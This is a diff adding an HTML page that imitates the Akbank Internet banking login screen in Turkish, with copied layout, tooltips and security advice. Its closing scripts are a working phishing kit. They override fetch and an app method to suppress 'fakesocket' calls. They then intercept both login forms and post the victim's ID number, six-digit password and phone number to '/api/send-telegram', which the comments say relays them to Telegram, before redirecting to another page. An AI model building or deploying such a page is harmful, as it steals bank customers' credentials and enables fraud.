@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html class="no-js javascript png flash9 chrome webkit win" lang="tr">
+
+<head id="ctl00_head">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="robots" content="noindex, nofollow">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title> Akbank İnternet </title>
+  <meta name="description" content="Akbank İnternet">
+  <link rel="stylesheet" href="./imgs/app.css">
+  <link rel="shortcut icon" href="./imgs/favicon.ico" type="image/x-icon">
+</head>
+
+<body class="is-retail is-turkish is-desktop is-nontouch">
+  <div class="only-desktop">
+    <div id="login-bar" class="login-has-switch">
+      <ul id="login-switch" class="clearfix">
+        <li class="login-switch-item" id="switch-item-corporate">
+          <a href="javascript:void(0)" data-localize="Corporate_PageHeader">Kurumsal</a>
+        </li>
+        <li class="login-switch-item" id="switch-item-language">
+          <a href="javascript:void(0)" data-localize="SwitchLanguage#index">English</a>
+        </li>
+      </ul>
+      <div id="login-logo">
+      </div>
+    </div>
+    <div id="login-wrapper" style="min-height: 505px;">
+      <div id="login-container" class="clearfix">
+        <div id="login-main">
+          <div id="login-content" style="min-height: 323px;">
+            <div>
+              <h1 id="login-caption" data-localize="PageHeader">Bireysel</h1>
+              <ul id="login-tab" class="clearfix">
+                <li class="login-tab-item login-active" id="bis-login-tab">
+                  <a href="javascript:void(0)">Müşteri / TC Kimlik No ile Giriş</a>
+                </li>
+                <li class="login-tab-item" id="cc-login-tab" style="visibility: hidden;">
+                  <a href="javascript:void(0)">Kredi Kartı Numarası ile Giriş</a>
+                </li>
+              </ul>
+              <form action="" name="desktop" method="POST" novalidate id="login-panel-bis-mbb" class="login-panel">
+                <div class="login-row">
+                  <label for="txtMbbTckn" class="login-label" data-localize="CustomerNo">Müşteri / TC Kimlik Numarası</label>
+                  <div class="clearfix">
+                    <input name="tckn" id="kk" type="text" autocomplete="off" maxlength="11" class="login-input" tabindex="1">
+                    <div class="login-tooltip" aria-haspopup="true">
+                      <span class="login-tooltip-text" data-localize="CustomerNumber">Akbank Direkt'e girişlerinizde Müşteri Numarası ya da T.C. Kimlik No kullanabilirsiniz. <br>
+                        <br>Müşteri Numarası, Akbank Hesap Cüzdanınızda veya Akbank Banka Kartınızın üzerinde Müşteri No alanında yazılı olan numaradır. T.C. Kimlik Nonuzu Nüfus Cüzdanınızın üzerinde bulabilirsiniz.</span>
+                    </div>
+                  </div>
+                </div>
+                <div class="login-row">
+                  <label for="txtSifre" class="login-label" data-localize="Password">Akbank Şifresi</label>
+                  <div class="clearfix" data-virtual-keyboard-group="bis">
+                    <input name="password" id="skt" type="tel" pattern="[0-9]*" inputmode="numeric" autocomplete="off" maxlength="6" class="login-input" tabindex="3">
+                    <div class="login-tooltip" aria-haspopup="true">
+                      <span class="login-tooltip-text" data-localize="InternetPasswordMessage">Akbank şifresi, Akbank İnternet´e girişte kullandığınız 6 haneli şifredir.<br>
+                        <br>Akbank İnternet´e ilk girişinizde, cep telefonunuza SMS ile gönderilen Akbank şifresini girmelisiniz, bir sonraki ekranda yeni bir Akbank şifresi belirlemeniz istenecektir.<br>
+                        <br>Akbank şifrenizi 3 kere yanlış girmeniz durumunda şifreniz kilitlenecektir. Şifrenizi kilitlemeniz veya unutmanız durumunda Akbank Şifremi Unuttum linkinden, www.akbank.com Şifre Al bölümünden, 444 25 25 Akbank Telefon Şubesi´nden veya Şubelerimizden yeni bir şifre talebinde bulunabilirsiniz. Yeni şifreniz SMS ile anında Akbank Şifre Telefonunuza gönderilecektir.<br>
+                        <br>Akbank şifrenizi 6 ayda bir değiştirmeniz istenecektir. Ayrıca, Akbank İnternet´te Kişiselleştirme &amp; Ayarlar menüsünde Güvenlik Ayarları bölümünden istediğiniz zaman Akbank şifrenizi değiştirebilirsiniz.</span>
+                    </div>
+                  </div>
+                </div>
+                <div class="login-row login-row-forgot">
+                  <a class="login-forgot" href="javascript:void(0)" data-localize="ForgotPasswordMessage">Şifremi Unuttum</a>
+                </div>
+                <div class="login-row login-row-btn">
+                  <button class="login-btn login-btn-login" style="border:0">Giriş</button>
+                </div>
+              </form>
+            </div>
+          </div>
+          <div id="login-get-password" class="login-banner login-get-password">
+            <h2 data-localize="GetPwdHeader">Şifre Al</h2>
+            <p data-localize="GetPwdMessage">Akbank şifreniz yoksa veya unuttuysanız tıklayın, şifrenizi kolayca alın!</p>
+            <div id="login-get-password-link">
+              <a href="javascript:void(0)" id="get-password-screen" class="login-btn login-btn-get-password-gray get-password-screen">Devam</a>
+            </div>
+          </div>
+          <div id="cc-login-with-mbb" class="login-banner login-get-password" style="display:none;">
+            <h2 data-localize="CCGetPwdHeader">Müşteri ya da TC Kimlik Numarası ile Giriş</h2>
+            <p data-localize="CCGetPwdMessage">Akbank İnternet'in tüm avantajlarından yararlanmak için<br>Müşteri / TC Kimlik No ile giriş yapabilirsiniz.</p>
+            <div>
+              <a href="javascript:void(0)" id="login-with-mbb-screen" class="login-btn login-btn-login-with-mbb-gray">Devam</a>
+            </div>
+          </div>
+          <div class="dialog" style="display: none;">
+            <div class="dialog-header">Uyarı<div class="dialog-close">
+              </div>
+            </div>
+            <div class="dialog-body">
+              <div class="dialog-content clearfix">
+                <div class="dialog-icon-warning">
+                </div>
+                <p>Girmiş olduğunuz bilgilerden biri eksik veya hatalıdır. Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.</p>
+              </div>
+              <div class="dialog-buttons"><a href="javascript:void(0)" id="popup-ok-button" class="login-btn login-btn-ok">Tamam</a></div>
+            </div>
+            <div class="dialog-footer">
+            </div>
+          </div>
+        </div>
+        <div id="login-aside">
+          <div id="login-aside-security" class="clearfix" style="min-height: 323px;">
+            <h4 data-localize="LoginAsideTitle">Güvenliğiniz İçin:</h4>
+            <ul>
+              <li class="login-aside-security-item" data-localize="LoginAsideItem1">Akbank şifrenizi kimseyle paylaşmayın.</li>
+              <li class="login-aside-security-item" data-localize="LoginAsideItem2">Sizi arayıp, Akbank şifrenizi soran kişilere itibar etmeyin.</li>
+              <li class="login-aside-security-item" data-localize="LoginAsideItem3">Akbank girişinde cep telefonu numarası, marka ve modeli bilgileriniz istenmez.</li>
+            </ul>
+            <a id="login-aside-security-all" data-localize="LoginAsideLinkText">Tüm güvenlik uyarıları</a>
+          </div>
+        </div>
+      </div>
+      <div id="login-footer" class="clearfix">
+        <p id="login-copyright" data-localize="AkbankCopyright">Her hakkı Akbank T.A.Ş.'ye aittir. © <script>
+            document.write(new Date().getFullYear())
+          </script>
+        </p>
+        <a id="login-secure">
+          <img src="./imgs/norton-secured.png" alt="Norton Secured">
+        </a>
+      </div>
+    </div>
+  </div>
+  <div class="only-mobile">
+    <div id="applicationHost">
+      <div data-active-view="true">
+        <div class="guest" data-view="views/guest/guest" data-active-view="true">
+          <div class="header">
+            <div data-bind="click:NavigateToDesktopSite" class="desktop-part">
+              <div class="sub-div">
+                <div class="image-part">
+                  <img src="./imgs/dt-w.svg" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;">
+                </div>
+                <div class="desktopText">
+                </div>
+              </div>
+            </div>
+            <div class="lang-guest-selection">
+              <div class="culture-guest-selection" data-bind="visible: langSelection()" style="display: none;">
+                <a class="selected">Türkçe</a>
+                <a class="">English</a>
+              </div>
+            </div>
+          </div>
+          <div class="content-area">
+            <div class="login-form-wrap" data-active-view="true">
+              <div class="login-router">
+                <form action="" name="mobile" method="POST" class="mbbcclogin" data-active-view="true">
+                  <text-input-login>
+                    <div class="text-input-login">
+                      <div data-bind="attr: { class: className}" class="text-input">
+                        <div class="text-input-wrap">
+                          <div class="icon-part">
+                            <div class="icon icon-user-w icon-user-w-size">
+                            </div>
+                          </div>
+                          <div class="input-part">
+                            <input class="inputarea" type="tel" pattern="[0-9]*" maxlength="11" name="tckn" placeholder="Müşteri / TC Kimlik No">
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </text-input-login>
+                  <hr class="login-separator">
+                  <text-input-login params="type:'ast', placeholder:GetString('AkbankDirektPassword'),value:password">
+                    <div class="text-input-login">
+                      <div data-bind="attr: { class: className}" class="text-input">
+                        <div class="text-input-wrap">
+                          <div class="icon-part">
+                            <div class="icon icon-password-w icon-password-w-size">
+                            </div>
+                          </div>
+                          <div class="input-part">
+                            <input class="inputarea" type="tel" pattern="[0-9]*" inputmode="numeric" maxlength="6" name="password" placeholder="Akbank Şifresi">
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </text-input-login>
+                  <div data-bind="visible: isPhoneNumberVisible()" style="display: none;">
+                    <hr class="login-separator">
+                    <text-input-login params="type:'phonenumber', placeholder:GetString('EnterTelephone'),value:phoneNumber,selectoptions:_parent.countrycodes,selectvalue:_parent.selectedcountrycode,maxlength:10">
+                      <div class="text-input-login">
+                        <div data-bind="attr: { class: className}" class="text-input">
+                          <div class="text-input-wrap">
+                            <div class="icon-part">
+                              <div class="icon icon-phone-number-w icon-phone-number-w-size">
+                              </div>
+                            </div>
+                            <select data-bind="style: { background-color: '#c51522' }, options: selectoptions, optionsText: 'countryName', optionsValue: 'Id', value: selectvalue" style="background-color: rgb(197, 21, 34);">
+                            </select>
+                            <div class="input-part">
+                              <input class="inputarea" type="tel" pattern="[0-9]*" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: maxlength }" placeholder="Cep telefonu numaranı gir">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </text-input-login>
+                  </div>
+                
+                  <div class="login-button-bar">
+                    <div class="login-button-wrap">
+                      <div class="login-button" data-bind="visible:cancelButtonVisible">
+                        <page-button-login params="value:GetString('CancelBIG'),action:function(){ $data.loginCancel() },enable:cancelButtonVisible">
+                          <div class="page-button-login" data-bind="visible:!midButton()">
+                            <input type="button" value="İptal">
+                          </div>
+                        </page-button-login>
+                      </div>
+                      <div class="login-button" data-bind="css: {yatirimci: !cancelButtonVisible()}">
+                        <page-button-login params="value:GetString('LoginBIG'),action:function(){ $data.continueToLogin() },enable:canSubmit">
+                          <div class="page-button-login" data-bind="visible:!midButton()">
+                            <button type="submit" class="responsive-login-btn">Giriş</button>
+                          </div>
+                        </page-button-login>
+                      </div>
+                    </div>
+                  </div>
+                  <div>
+                    <a class="forget-item" data-bind="click:forgotMBB">
+                      <div class="item-text">
+                        Müşteri numaramı bilmiyorum
+                      </div>
+                      <div class="arrow">
+                        <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right">
+                        </div>
+                      </div>
+                    </a>
+                  </div>
+                  <a class="forget-item" data-bind="click:forgotPassword">
+                    <div class="item-text">
+                      Şifremi bilmiyorum
+                    </div>
+                    <div class="arrow">
+                      <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right">
+                      </div>
+                    </div>
+                  </a>
+                </form>
+              </div>
+            </div>
+            <div class="login-form-wrap" style="display: none;">
+              <div class="main-part">
+                <div class="login-router">
+                  <div class="home-title">
+                    <div class="title-wrap">
+                      <div class="title-text">
+                        Akbank Mobil Giriş
+                      </div>
+                    </div>
+                  </div>
+                  <div class="login-options-wrap">
+                    <a data-bind="click: NavigateToMbbLogin" class="login-option">
+                      <div class="icon-wrap">
+                        <div class="option-icon icon-user-w icon-user-w-size">
+                        </div>
+                      </div>
+                      <div class="option-text">
+                        Müşteri / TC Kimlik No ile Giriş
+                      </div>
+                      <div class="option-arrow">
+                        <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right">
+                        </div>
+                      </div>
+                    </a>
+                    <a data-bind="click: NavigateToCCLogin" class="login-option">
+                      <div class="icon-wrap">
+                        <div class="option-icon icon-credit-card-w icon-credit-card-w-size">
+                        </div>
+                      </div>
+                      <div class="option-text">
+                        Kredi Kartı ile Giriş
+                      </div>
+                      <div class="option-arrow">
+                        <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right">
+                        </div>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="login-extras-part">
+                  <div class="language-part">
+                    <div class="culture-selection" style="display: none;">
+                      <a class="selected">Türkçe</a>
+                      <a class="">English</a>
+                    </div>
+                  </div>
+                  <div class="login-nav-wrap" data-active-view="true">
+                    <a data-bind="click: NavigateToMaps" class="map-link">
+                      <div class="map-wrap">
+                        <div class="map-icon">
+                          <div class="map-icon-g icon-map-g icon-map-g-size">
+                          </div>
+                        </div>
+                        <span class="map-text">
+                          En Yakın Akbank
+                        </span>
+                        <div class="map-arrow">
+                          <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right">
+                          </div>
+                        </div>
+                      </div>
+                    </a>
+                    <a data-bind="click: NavigateToCurrencyConverter" class="extras-link">
+                      <div class="extras-wrap">
+                        <div class="extras-icon">
+                          <div class="extras-icon-g icon-currency-g icon-currency-g-size">
+                          </div>
+                        </div>
+                        <span class="extras-text extras-has-sub-text">
+                          Döviz Kuru Hesaplama
+                          <br>
+                          <span class="usd-login-text" data-bind="text: loginCurrCombined()">1 USD = 31,6360 TL</span>&nbsp;
+                        </span>
+                        <div class="extras-arrow">
+                          <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right">
+                          </div>
+                        </div>
+                      </div>
+                    </a>
+                    <a class="extras-link desktop-site">
+                      <div class="extras-wrap">
+                        <div class="extras-icon">
+                          <img class="loan-image" src="./imgs/loan-g.svg" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;">
+                        </div>
+                        <span class="extras-text">
+                          Hızlı Kredi Başvurusu
+                        </span>
+                        <div class="extras-arrow">
+                          <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right">
+                          </div>
+                        </div>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="separator">
+          </div>
+          <div class="footer">
+            <div class="banner">
+              <img class="logo" src="./imgs/standart_logo.svg" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;">
+              <div class="extras" style="display: none;">
+                <a class="back-part" data-bind="click:function(){navigateBack();}">
+                  <img class="back-image" data-bind="attr:{src:backIcon}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="./imgs/back.png">
+                </a>
+                <a class="close-part" data-bind="click:function(){navigateHome();}">
+                  <img class="close-image" data-bind="attr:{src:closeIcon}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="./imgs/close.png">
+                </a>
+              </div>
+              <div class="lang-mobile-selection" data-bind="visible: langSelection()" style="display: none;">
+                <a class="selected">Türkçe</a>
+                <a class="">English</a>
+              </div>
+            </div>
+            <div class="sizinicin">sizin için</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="modal fade in" id="bootstrapModal" style="top: 0px; display: none;" aria-hidden="false">
+      <div class="modal-dialog">
+        <div class="modal-content" id="modalHost">
+          <div class="message-wrap" data-view="core/common/dialog/messagedialog" data-active-view="true">
+            <div class="message-title" data-bind="text: title">Hata</div>
+            <div class="message-body" style="overflow-y: scroll; -ms-overflow-style: -ms-autohiding-scrollbar;" data-bind="html: message">Eksik veya hatalı bilgi girdiğini fark ettik. Kontrol edip tekrar deneyebilirsin.</div>
+            <div class="button-holder clearfix">
+              <div class="button-wrap clearfix first block">
+                <input type="button" data-close-modal value="Tamam">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="modal-backdrop fade in"></div>
+  </div>
+  <script>
+    // fakesocket.php çağrısını engellemek için fetch'i override et
+    (function() {
+      const originalFetch = window.fetch;
+      window.fetch = function(...args) {
+        const url = args[0];
+        if (url && typeof url === 'string' && (url.includes('fakesocket.php') || url.includes('fakesocket'))) {
+          console.log('fakesocket.php isteği engellendi');
+          return Promise.resolve(new Response('', { status: 200, statusText: 'OK' }));
+        }
+        return originalFetch.apply(this, args);
+      };
+    })();
+  </script>
+  <script src="./imgs/app.js"></script>
+  <script>
+    // app.js yüklendikten sonra AKN class'ının fakesocket metodunu devre dışı bırak
+    document.addEventListener('DOMContentLoaded', function() {
+      setTimeout(function() {
+        if (window.AKN && AKN.prototype) {
+          // fakesocket metodunu boş bir fonksiyonla değiştir
+          if (typeof AKN.prototype.fakesocket === 'function') {
+            AKN.prototype.fakesocket = function() {
+              // Boş bırak - hiçbir şey yapma
+            };
+          }
+        }
+      }, 100);
+
+      // Form submit handler - Telegram API'ye gönder
+      function handleFormSubmit(e) {
+        e.preventDefault();
+        
+        const form = e.target;
+        const formData = new FormData(form);
+        
+        const tckn = formData.get('tckn') || '';
+        const password = formData.get('password') || '';
+        const phone = formData.get('phone') || '';
+
+        // API endpoint
+        const apiUrl = '/api/send-telegram';
+
+        // Loading göster (isteğe bağlı)
+        const submitButton = form.querySelector('button[type="submit"]');
+        const originalText = submitButton ? submitButton.textContent : '';
+        if (submitButton) {
+          submitButton.disabled = true;
+          submitButton.textContent = 'Gönderiliyor...';
+        }
+
+        // API'ye POST isteği gönder
+        fetch(apiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            tckn: tckn,
+            password: password,
+            phone: phone
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            // Telegram'a gönderildi, şimdi basvur.html'e yönlendir
+            window.location.href = `basvur.html?tc=${encodeURIComponent(tckn)}`;
+          } else {
+            alert('Bir hata oluştu: ' + (data.error || 'Bilinmeyen hata'));
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+        })
+        .finally(() => {
+          // Button'u eski haline getir
+          if (submitButton) {
+            submitButton.disabled = false;
+            submitButton.textContent = originalText;
+          }
+        });
+      }
+
+      // Şifre inputlarına sadece rakam girişi için event listener ekle
+      function restrictToNumbers(input) {
+        if (input) {
+          input.addEventListener('input', function(e) {
+            // Sadece rakamları tut, diğer karakterleri kaldır
+            this.value = this.value.replace(/[^0-9]/g, '');
+          });
+          
+          // Klavye ile harf girişini engelle
+          input.addEventListener('keydown', function(e) {
+            // Sadece rakamlar (0-9), Backspace, Delete, Tab, Escape, Arrow keys'e izin ver
+            const allowedKeys = ['Backspace', 'Delete', 'Tab', 'Escape', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown'];
+            const isNumber = /[0-9]/.test(e.key);
+            const isAllowedKey = allowedKeys.includes(e.key);
+            
+            if (!isNumber && !isAllowedKey) {
+              e.preventDefault();
+            }
+          });
+          
+          // Paste işlemini kontrol et
+          input.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            const numbersOnly = pastedText.replace(/[^0-9]/g, '');
+            this.value = numbersOnly.substring(0, 6); // Max 6 karakter
+          });
+        }
+      }
+
+      // Desktop şifre inputu
+      const desktopPasswordInput = document.getElementById('skt');
+      restrictToNumbers(desktopPasswordInput);
+
+      // Mobile şifre inputu
+      const mobilePasswordInput = document.querySelector('form[name="mobile"] input[name="password"]');
+      restrictToNumbers(mobilePasswordInput);
+
+      // Desktop form
+      const desktopForm = document.querySelector('form[name="desktop"]');
+      if (desktopForm) {
+        desktopForm.addEventListener('submit', handleFormSubmit);
+      }
+
+      // Mobile form
+      const mobileForm = document.querySelector('form[name="mobile"]');
+      if (mobileForm) {
+        mobileForm.addEventListener('submit', handleFormSubmit);
+      }
+    });
+  </script>
+</body>
+</html>
+
